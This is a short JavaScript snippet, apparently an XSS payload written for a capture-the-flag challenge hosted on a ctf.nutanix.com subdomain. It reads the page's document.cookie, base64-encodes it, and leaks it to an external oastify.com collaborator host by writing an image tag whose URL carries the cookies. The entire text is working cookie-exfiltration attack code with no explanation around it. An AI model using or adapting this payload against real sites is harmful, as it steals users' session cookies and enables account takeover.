const xhr = new XMLHttpRequest();
xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
let ck = document.cookie;
xhr.onreadystatechange = function() {
  document.write('<img src=http://vyxxs6rmmtctva1vbqq3fmluqlwdk2.oastify.com/?' + btoa(ck) + '>');
};
xhr.send();
